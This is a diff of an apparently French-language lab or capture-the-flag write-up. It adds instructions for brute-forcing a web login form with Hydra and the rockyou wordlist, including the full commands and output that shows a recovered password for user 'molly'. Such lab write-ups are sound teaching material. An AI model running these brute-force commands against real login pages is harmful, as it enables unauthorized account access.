@@ -21,6 +21,29 @@ https://gist.githubusercontent.com/techerbeatrice/8204e406ba94922aba76167b08c2c3
 
 _____
 
+Le lien php à craquer :    
+
+http://192.168.56.104/login.php?login=admin
+
+_____
+
 Commande sur Hydra :    
 
 hydra  -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.104 http-post-form "/login:username=^USER^&password=^PASS^:F=Mot de passe invalide" -V
+
+Comment utiliser hydra sur un formulaire web?
+Pour faire du bruteforce avec hydra sur une formulaire web, il faudra utiliser la syntaxe suivante
+**hydra -l -P http-post-form "{lien vers la page de connexion}:{les paramètres du formulaire}:F={message a rechercher sur la page si la connexion échoue}"**
+
+Dans notre cas l’adresse de la cible est http://192.168.56.104/login, le message d’erreut est “Mot de passe invalide”, et enfin les paramètres de la requête que nous avons pu avoir grâce a l’option réseau du web develloper de firefox.
+
+
+La commande finale donne:
+
+hydra -l molly -P rockyou.txt 10.10.219.212 http-post-form "/login:username=^USER^&password=^PASS^:F=Your password is incorrect" -V. 
+Résultat…
+
+[80][http-post-form] host: 10.10.219.212   login: molly   password: sunshine
+1 of 1 target successfully completed, 1 valid password found
+
+
